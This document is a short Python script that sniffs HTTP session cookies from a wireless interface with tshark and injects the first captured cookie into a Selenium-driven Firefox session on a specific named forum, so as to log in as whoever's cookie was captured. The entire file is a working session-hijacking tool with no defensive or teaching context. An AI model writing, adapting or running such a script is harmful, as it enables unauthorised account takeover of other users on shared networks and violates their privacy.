from selenium import webdriver
import subprocess

interface = 'wlp2s0'
duration_time = 20
output = []
sub = subprocess.run(f'sudo tshark -i {interface} -Y http.request -T fields -e http.cookie -a duration:{duration_time}'.split(),
                     stdout=subprocess.PIPE)
print(sub.stdout.decode('utf-8').split('\n')[0])
driver = webdriver.Firefox()
driver.get('http://forum.pokemony.com/index.php')
driver.add_cookie({'name': 'forum.pokemony.com', 'value': sub.stdout.decode('utf-8').split('\n')[0]})
driver.refresh()